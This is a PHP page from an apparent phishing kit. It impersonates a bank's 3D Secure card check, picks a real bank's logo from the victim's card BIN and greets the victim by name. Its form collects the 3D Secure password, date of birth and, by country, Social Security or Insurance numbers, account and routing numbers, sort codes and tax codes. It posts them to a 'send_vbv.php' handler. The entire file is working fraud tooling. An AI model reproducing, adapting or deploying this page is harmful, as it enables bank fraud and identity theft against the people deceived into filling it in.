<?php

include('boot.php');

session_start();

include './Block.php';

$HF_V = $_SESSION['country_name'];
 

$zz = $_SESSION['nn'];

$st = str_replace(' ', '', $zz);

$ee = substr($st, 0 , 6);

$last = substr($st, -3 );


    include ("inc/func.php");

    @$CardNumber = $ee;
    @$BankInfo = BinInfo($CardNumber);

    @$BankName = $BankInfo->issuer; // Bank Name 
    @$BankIn   = $BankInfo->bin; // Bins
    @$BankBrand = $BankInfo->brand; // Type CCV ## Visa Or Master Cart

    @$_SESSION['n_bank'] = $BankName;

?>
<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8" />
  <link rel="shortcut icon" type="image/x-icon" href="./img/2.ico">
  <meta name="viewport" content="initial-scale=1.0">
  <title>Secrity Your Cart</title>
  <link rel="stylesheet" type="text/css" href="css/vbvx.css">
</head>
<body>
 <div class="al">
    <header>
    <div class="logo_bank">
      <?php
          if($BankName=="BANCO DE AHORRO Y CREDITO DE LAS AMERICAS" ){
       echo '<img style="max-width: 110px;" src="./img/Bank/banre.gif">';
   }
   
   if($BankName=="VISALUX S.C" ){
       echo '<img style="max-width: 110px;" src="./img/Bank/spuerkeess.gif">';
   }
   
   if($BankName=="BANKA KOMBETARE TREGTARE SH.A." ){
       echo '<img style="max-width: 110px;" src="./img/Bank/bkt.gif">';
   }

   if($BankName=="BANK OF NOVA SCOTIA" ){
       echo '<img style="max-width: 110px;" src="./img/Bank/noobscot.png">';
   }

    else if($BankName=="HSBC" || $BankName=="HSBC BANK" || $BankName=="HSBC BANK PLC"){
           echo '<img style="max-width: 110px;" src="./img/Bank/noobhsbc.gif">';
       }

    else if($BankName=="EURO KARTENSYSTEME GMBH" ){
           echo '<img style="max-width: 110px;" src="./img/Bank/noobnbk.gif">';
       }

    else if($BankName=="LLOYDS"){
           echo '<img style="max-width: 110px;" src="./img/Bank/noobloyd.png">';
       }

    else if($BankName=="ROYAL BANK OF SCOTLAND" || $BankName=="ROYAL BANK OF SCOTLAND PLC" ){
           echo '<img style="max-width: 110px;" src="./img/Bank/noobrbc.png">';
       }


    else if($BankName=="NATIONAL WESTMINSTER BANK PLC" || $BankName=="NAT WEST" || $BankName=="NATWEST" ){
           echo '<img style="max-width: 110px;" src="./img/Bank/noobnat.gif">';
       }

    else if($BankName=="WELLS FARGO BANK, N.A." ){
           echo '<img style="max-width: 110px;" src="./img/Bank/well.gif">';
       }
    else if($BankName=="UBS AG" ){
           echo '<img style="max-width: 110px;" src="./img/Bank/ubs.png">';
       }

    else if($BankName=="NATIONWIDE" || $BankName=="NATIONWIDE BUILDING SOCIETY" ){
           echo '<img style="max-width: 110px;" src="./img/Bank/noobnwide.gif">';
       }


    else if($BankName=="BARCLAYS" || $BankName=="BARCLAYS BANK PLC" ){
           echo '<img style="max-width: 110px;" src="./img/Bank/barcli.gif">';
       }

       
       

    else if($BankName=="ULSTER BANK, LTD." ){
           echo '<img style="max-width: 110px;" src="./img/Bank/ulsterbnk.gif">';
       }
       
       
    else if($BankName=="CLYDESDALE BANK PLC" ){
           echo '<img style="max-width: 110px;" src="./img/Bank/clyde.gif">';
       }

    else if($BankName=="SANTANDER" || $BankName=="SANTANDER UK PLC" || $BankName=="SANTANDER CENTRAL HISPANO" ){
           echo '<img style="max-width: 110px;" src="./img/Bank/san.gif">';
       }

    else if($BankName=="BANCO SANTANDER, S.A." ){
           echo '<img style="max-width: 110px;" src="./img/Bank/open.gif">';
       }

    else if($BankName=="FIRST DIRECT, DIVISION OF HSBC UK" ){
           echo '<img style="max-width: 110px;" src="./img/Bank/fdirect.gif">';
       }

    else if($BankName=="BARCLAYCARD" ){
           echo '<img style="max-width: 110px;" src="./img/Bank/noobbarclay.gif">';
       }
       
    else if($BankName=="NATIONAL AUSTRALIA BANK, LTD." ){
           echo '<img style="max-width: 110px;" src="./img/Bank/nab.png">';
       }
    else if($BankName=="TELLER, A.S." ){
           echo '<img style="max-width: 110px;" src="./img/Bank/tellr.gif">';
       }

    else if($BankName=="BANK OF AMERICA" || $BankName == "BANK OF AMERICA, N.A." ){
           echo '<img style="max-width: 110px;" src="./img/Bank/bofa.gif">';
       }

    else if($BankName=="MBNA EUROPE BANK, LTD." ){
           echo '<img style="max-width: 110px;" src="./img/Bank/noobmbna.png">';
       }

    else if($BankName=="BANK OF IRELAND" ){
           echo '<img style="max-width: 110px;" src="./img/Bank/boirland.png">';
       }

    else if($BankName=="LANSFORSAKRINGAR BANK AB" ){
           echo '<img style="max-width: 110px;" src="./img/Bank/lansfor.png">';
       }

    else if($BankName=="CITIBANK INTERNATIONAL PLC" ){
           echo '<img style="max-width: 110px;" src="./img/Bank/citi.gif">';
       }

    else if($BankName=="Nordea" || $BankName=="NORDEA BANK FINLAND PLC" || $BankName=="NORDEA BANK DANMARK A/S" ){
           echo '<img style="max-width: 110px;" src="./img/Bank/nordea.png">';
       }



    else if($BankName=="BANGKOK BANK PUBLIC CO., LTD." ){
           echo '<img style="max-width: 110px;" src="./img/Bank/Bangkobnk.png">';
       }

       
       
    else if($BankIn=="475111" ){
           echo '<img style="max-width: 110px;" src="./img/Bank/ulsterbnk.gif">';
       }
       
       
    else if($BankIn=="518652" ){
           echo '<img style="max-width: 110px;" src="./img/Bank/teskobnk.gif">';
       }
       
       
    else if($BankIn=="462239" ){
           echo '<img style="max-width: 110px;" src="./img/Bank/anz.gif">';
       }
    else if($BankIn=="431938" ){
           echo '<img style="max-width: 110px;" src="./img/Bank/boi.gif">';
       }

    else if($BankIn=="524590" ){
           echo '<img style="max-width: 110px;" src="./img/Bank/bglbnp.gif">';
       }
       
    else if($BankIn=="429941" ){
           echo '<img style="max-width: 110px;" src="./img/Bank/eikalogo.svg">';
       }

    else if($BankIn=="462287" ){
           echo '<img style="max-width: 110px;" src="./img/Bank/Bangkobnk.png">';
       }

    else if($BankIn=="516815" ){
           echo '<img style="max-width: 110px;" src="./img/Bank/swedbnk.png">';
       }

    else if($BankName=="Swedbank" || $BankName=="SWEDBANK AB" ){
           echo '<img style="max-width: 110px;" src="./img/Bank/swedbnk.png">';
       }

    else if($BankIn=="462845" || $BankIn=="554827" || $BankIn=="526471" ){
           echo '<img style="max-width: 110px;" src="./img/Bank/dbs.gif">';
       }

    else if($BankIn=="517011" ){
           echo '<img style="max-width: 110px;" src="./img/Bank/netstech.png">';
       }

    else if($BankName=="KASIKORNBANK PUBLIC CO., LTD." ){
           echo '<img style="max-width: 110px;" src="./img/Bank/bgo.gif">';
       }

    else if($BankName=="BANK OF CYPRUS PUBLIC CO., LTD." ){
           echo '<img style="max-width: 110px;" src="./img/Bank/bnkofcy.png">';
       }

    else if($BankName=="DESJARDINS" || $BankName=="LA FEDERATION DES CAISSES DESJARDINS DU QUEBEC" ){
           echo '<img style="max-width: 110px;" src="./img/Bank/desjardinsbnk.png">';
       }

    else if($BankName=="HALIFAX" ){
           echo '<img style="max-width: 110px;" src="./img/Bank/halif.gif">';
       }

    else if($BankName=="SCHWEIZERISCHER BANKVEREIN (SWISS BANK CORPORATION" ){
           echo '<img style="max-width: 110px;" src="./img/Bank/sissbnkcoop.png">';
       }

    else if($BankName=="CIBC" || $BankName=="CANADIAN IMPERIAL BANK OF COMMERCE" ){
           echo '<img style="max-width: 110px;" src="./img/Bank/cibc.png">';
       }
       
    else if($BankName=="BANK OF MONTREAL" ){
           echo '<img style="max-width: 110px;" src="./img/Bank/bnkmontreal.png">';
       }

    else if($BankName=="NATIONAL BANK OF CANADA" ){
           echo '<img style="max-width: 110px;" src="./img/Bank/nationalbank.png">';
       }

    else if($BankName=="ROYAL BANK OF CANADA" || $BankName=="RBC ROYAL BANK OF CANADA" ){
           echo '<img style="max-width: 110px;" src="./img/Bank/rbc.png">';
       }

    else if($BankName=="TD CANADA TRUST" || $BankName=="COMPASS BANK" || $BankName=="TORONTO-DOMINION BANK" ){
           echo '<img style="max-width: 110px;" src="./img/Bank/canadatrust.gif">';
       }

    else if($BankIn=="446291" ){
           echo '<img style="max-width: 110px;" src="./img/Bank/halif.gif">';
       }  
     
    else if($BankIn=="472409" ){
           echo '<img style="max-width: 110px;" src="./img/Bank/canadatrust.gif">';
       }
       
    else if($BankName=="WESLEYAN SAVINGS BANK, LTD." ){
           echo '<img style="max-width: 110px;" src="./img/Bank/wesle.png">';
       }

    else if($BankName=="CO-OPERATIVE BANK PLC" ){
           echo '<img style="max-width: 110px;" src="./img/Bank/coperative.png">';
       }

    else if($BankName=="STANDARD CHARTERED BANK" ){
           echo '<img style="max-width: 110px;" src="./img/Bank/standar.png">';
       }

    else if($BankName=="ALLIANCE AND LEICESTER PLC" ){
           echo '<img style="max-width: 110px;" src="./img/Bank/alliance.png">';
       }

    else if($BankName=="BANCO SABADELL" ){
           echo '<img style="max-width: 110px;" src="./img/Bank/saba.png">';
       }

    else if($BankName=="PRESIDENT'S CHOICE FINANCIAL" ){
           echo '<img style="max-width: 110px;" src="./img/Bank/president.png">';
       }

    else if($BankName=="CAPITAL ONE BANK OF CANADA BRANCH" || $BankName=="CAPITAL ONE BANK (CANADA BRANCH)" || $BankName=="CAPITAL ONE BANK (USA), N.A." ||  $BankName=="CAPITAL ONE BANK N.A." ){
           echo '<img style="max-width: 110px;" src="./img/Bank/capitalone.png">';
       }

    else if($BankName=="SEB" || $BankName=="SKANDINAVISKA ENSKILDA BANKEN AB" ){
           echo '<img style="max-width: 110px;" src="./img/Bank/SEBlogo.png">';
       }
       

    else if($BankName=="BNP PARIBAS FORTIS" ){
           echo '<img style="max-width: 110px;" src="./img/Bank/bnpt.jpg">';
       }

    else if($BankName=="BNP PARIBAS" ){
           echo '<img style="max-width: 110px;" src="./img/Bank/bnp.png">';
       }

    else if($BankName=="BANCO POPULAR DE PUERTO RICO" ){
           echo '<img style="max-width: 110px;" src="./img/Bank/bancopop.gif">';
       }

    else if($BankName=="Handelsbanken" ){
           echo '<img style="max-width: 110px;" src="./img/Bank/hand.png">';
       }
       
    else if($BankName=="METRO BANK PLC" ){
           echo '<img style="max-width: 110px;" src="./img/Bank/metro.gif">';
       }

    else if($BankName=="LLOYDS TSB"  || $BankName=="LLOYDS TSB BANK PLC" ){
           echo '<img style="max-width: 110px;" src="./img/Bank/tsb1.gif">';
       }

    else if($BankName=="BANK OF NEW ZEALAND" ){
           echo '<img style="max-width: 110px;" src="./img/Bank/bnz.gif">';
       }

    else if($BankName=="EVO BANCO" ){
           echo '<img style="max-width: 110px;" src="./img/Bank/EVO.png">';
       }

    else if($BankName=="BANCO POPULAR DE PUERTO RICO" ){
           echo '<img style="max-width: 110px;" src="./img/Bank/bancopopular.gif">';
       }

    else if($BankName=="CAIXABANK S.A." || $BankName=="LA CAIXA" ){
           echo '<img style="max-width: 110px;" src="./img/Bank/CaixaCard.gif">';
       }

    else if($BankName=="UNITED NATIONAL BANK, LTD." ){
           echo '<img style="max-width: 110px;" src="./img/Bank/unb.jpg">';
       }

    else if($BankName=="BANCA MARCH, S.A." ){
           echo '<img style="max-width: 110px;" src="./img/Bank/march.gif">';
       }

    else if($BankName=="BRD - GROUPE SOCIETE GENERALE, S.A." ){
           echo '<img style="max-width: 110px;" src="./img/Bank/brd.jpg">';
       }

    else if($BankName=="SOCIETE GENERALE, S.A." ){
           echo '<img style="max-width: 110px;" src="./img/Bank/stegenerale.png">';
       }

    else if($BankName=="FIRST DIRECT, DIVISION OF HSBC UK" ){
           echo '<img style="max-width: 110px;" src="./img/Bank/fdirect.gif">';
       }

    else if($BankName=="LLOYDS BANK PLC" ){
           echo '<img style="max-width: 110px;" src="./img/Bank/Lloydsopop.gif">';
       }

    else if($BankName=="RAIFFEISEN BANK SH.A." ){
           echo '<img style="max-width: 110px;" src="./img/Bank/RaiffeisenBankLogo.jpg">';
       }

    else if($BankName=="ACCESS BANK PLC" ){
           echo '<img style="max-width: 110px;" src="./img/Bank/ACCESS-BANK.jpg">';
       }

    else if($BankName=="ERSTE AND STEIERMARKISCHE BANK D.D." ){
           echo '<img style="max-width: 110px;" src="./img/Bank/ERSTE.png">';
       }

    else if($BankName=="CHASE BANK USA, N.A." ){
           echo '<img style="max-width: 110px;" src="./img/Bank/chase.jpg">';
       }

    else if($BankName=="JPMORGAN CHASE BANK, N.A." ){
           echo '<img style="max-width: 110px;" src="./img/Bank/jpmorganchase.jpg">';
       }

    else if($BankName=="COMMONWEALTH BANK OF AUSTRALIA" || $BankName == "COMMONWEALTH BANK" ){
           echo '<img style="max-width: 110px;" src="./img/Bank/old-commonwealth-bank-logo-1024x379-1024x379.jpg">';
       }
    else if($BankName=="ASB BANK" ){
           echo '<img style="max-width: 110px;" src="./img/Bank/asb.jpg">';
       }
    else if($BankName=="STANDARD CHARTERED GRINDLAYS (OFFSHORE), LTD." ){
           echo '<img style="max-width: 110px;" src="./img/Bank/standard-chartered-uk.jpg">';
       }
    else if($BankName=="U.S. BANK N.A. ND" ){
           echo '<img style="max-width: 110px;" src="./img/Bank/comp_1_logo-usbank-siteheader.png">';
       }
    else if($BankName=="REGIONS BANK" ){
           echo '<img style="max-width: 110px;" src="./img/Bank/REG_color_register.jpg">';
       }
    else if($BankName=="BRANCH BANKING AND TRUST COMPANY" ){
           echo '<img style="max-width: 110px;" src="./img/Bank/bbtlogo.jpg">';
       }
    else if($BankName=="PNC BANK, N.A." ){
           echo '<img style="max-width: 110px;" src="./img/Bank/pnc.png">';
       }
    else if($BankName=="SHAZAM, INC." ){
           echo '<img style="max-width: 110px;" src="./img/Bank/SHAZAM_CMYK.png">';
       }
    else if($BankName=="CITIBANK, N.A." || $BankName == "CITIBANK"){
           echo '<img style="max-width: 110px;" src="./img/Bank/CITIBANK.jpg">';
       }
    else if($BankName=="KRUNGTHAI CARD PUBLIC CO., LTD." ){
           echo '<img style="max-width: 110px;" src="./img/Bank/csr-ktb-brandage13062554-1.jpg>';
       }
    else if($BankName=="KRUNG THAI BANK PUBLIC CO., LTD." ){
           echo '<img style="max-width: 110px;" src="./img/Bank/krungthai bank.png">';
       }
    else if($BankName=="BANGKOK BANK PUBLIC CO., LTD." ){
           echo '<img style="max-width: 110px;" src="./img/Bank/Bangkok_bank.png">';
       }
    else if($BankName=="NATIONAL WESTMINSTER BANK PLC" ){
           echo '<img style="max-width: 110px;" src="./img/Bank/NationalWestminsterBank1970.png">';
       }
    else if($BankName=="M BANK, F.S.B." ){
           echo '<img style="max-width: 110px;" src="./img/Bank/Mbank-logo.jpg">';
       }
    else if($BankName=="CARTASI S.P.A." ){
           echo '<img style="max-width: 110px;" src="./img/Bank/cartasi.jpg">';
       }
    else if($BankName=="CHELSEA GROTON BANK" ){
           echo '<img style="max-width: 110px;" src="./img/Bank/CG_Stacked_A.png">';
       }
    else if($BankName=="GWINNETT F.C.U." ){
           echo '<img style="max-width: 110px;" src="./img/Bank/GCB_Logo005a.png">';
       }
    else if($BankName=="GE CAPITAL RETAIL BANK" ){
           echo '<img style="max-width: 110px;" src="./img/Bank/GE-Capital-Logo.jpg">';
       }
    else if($BankName=="JPMORGAN CHASE BANK, N.A." ){
           echo '<img style="max-width: 110px;" src="./img/Bank/jpmorganchase.jpg">';
       }

    else if($BankName=="FIRST DIRECT, DIVISION OF HSBC UK" ){
           echo '<img style="max-width: 110px;" src="./img/Bank/fdirect.gif">';
       }

    else if($BankName=="CREDIT ONE BANK, N.A." ){
           echo '<img style="max-width: 110px;" src="./img/Bank/CreditOne.jpg">';
       }
    else if($BankName=="FIRST DIRECT, DIVISION OF HSBC UK" ){
           echo '<img style="max-width: 110px;" src="./img/Bank/fdirect.gif">';
       }
    else if($BankName==NULL ) {
          echo '<img style="max-width: 110px;" src="./img/logo_ppl_106x29.png">';
       }
       
    else {
          echo '<img style="max-width: 110px;" src="./img/logo_ppl_106x29.png">';
       } 
         ?>
         </div>
         <div class="logo_ssl">
           <img src="img/ssl.png">
         </div>
    </header>
    <div class="pp">
      <p id="nn_bank"><?php
        echo @$BankName;
      ?></p>
      <p id="majd">Dear <?php echo @$_SESSION['full_name'];?></p>
      <p id="zz">We protects your card against unauthorised use online, you have noting to fear. We just ensure that you are the legal owner of this account.</p>
      <div class="ma3art">
        <div class="time">
          <span class="dt"><i>Date :</i></span> 
          <span class="tim"><i>
          <?php echo date('H:i:s');?></i></span>
        </div>
        <div class="_ccv">
          <span class="_n_ccv"><i>Number Cart :</i></span>
          <span class="tim"><i>xxxx-xxxx-xxxx-<?php echo $last; ?></i></span>
        </div>
      </div>
      <p id="pl">Please enter your information correctly :</p>
      <form action="send/send_vbv.php" method="post">
    <div class="hassan">
          <label for="d" style="margin-right:56px;font-size: 14px;">Name on Card:</label>
            <input type="text" name="noc" id="noc" required>
        </div>
        <div class="hassan">
          <label for="d" style="margin-right:84px;font-size: 14px;">3D Secure</label>
            <input type="password" name="_3d" id="d" required>
        </div>
      <div class="hassan">
          <label for="date" style="margin-right: 73px;font-size: 14px;">Date of Birth</label>
            <input type="text" name="date" id="date" placeholder="dd-mm-yyyy" required>
        </div>
<?php
if ($HF_V=="United States"){ echo '
<div class="hassan">
          <label for="ssn" style=" font-size: 14px;   margin-right: 43px;">Routing Number:</label>
            <input name="rgn" maxlength="15" id="rgn" type="text" required>
</div>
';}
?>
<?php
if ($HF_V=="Canada"){ echo '
<div class="hassan">
          <label for="ssn" style=" font-size: 13px;   margin-right: 1px;">Social Insurance Number:</label>
            <input maxlength="15" name="sin" id="sin" type="text">
</div>
';}
?>
<?php if ($HF_V=="United States"  or $HF_V=="Ireland"){ echo '
<div class="hassan">
          <label for="ssn" style=" font-size: 14px;   margin-right: 1px;">Social Security Number:</label>
            <input maxlength="11" name="ssn" id="ssn" type="text"  placeholder="XXX-XX-XXXX" required>
</div>
';}?>
<?php if ($HF_V=="United States" or $HF_V=="United Kingdom" or $HF_V=="Australia" or $HF_V=="Ireland"){ echo '
<div class="hassan">
          <label for="ssn" style=" font-size: 14px;   margin-right: 43px;">Account Number:</label>
            <input maxlength="15" name="an" id="an" type="text" required>
</div>
';}?>
<?php if ($HF_V=="United Kingdom" or $HF_V=="Ireland" ){ echo '
<div class="hassan">
          <label for="ssn" style=" font-size: 14px;   margin-right: 83px;">Sort Code:</label>
            <input name="sc" maxlength="8" id="sc" type="text" "XX-XX-XX" required>
</div>
';} ?>
<?php if ($HF_V=="Switzerland" or $HF_V=="Germany" ){ echo '
<div class="hassan">
          <label for="ssn" style=" font-size: 14px;   margin-right: 17px;">Kartenkontonummer:</label>
            <input name="ka" id="ka" type="text" maxlength="19"   required>
</div>
';} ?>
<?php
if ($HF_V=="Australia"){ echo '
<div class="hassan">
          <label for="ssn" style=" font-size: 14px;   margin-right: 61px;">OSID Number:</label>
            <input name="on" id="on" type="text" required>
        </div>
<div class="hassan">
          <label for="ssn" style=" font-size: 14px;   margin-right: 76px;">Credit Limit:</label>
            <input name="cl" id="cl" type="text" required>
        </div>
';}
?>
<?php
if ($HF_V=="Italy"){ echo '
<div class="hassan">
          <label for="ssn" style=" font-size: 14px;   margin-right: 59px;">Codice Fiscale:</label>
            <input name="on" id="on" type="text" required>
        </div>
';}
?>
        <div id="inco">
          <input type="submit" name="sbt" value="Submit" style="width: 70px;">
        </div>
      </form>
      <footer>
        <span>Copyright &copy; 1999-20<?php echo date('y');?> . All rights reserved.</span>
      </footer> 
    </div>
   </div>

</body>
</html>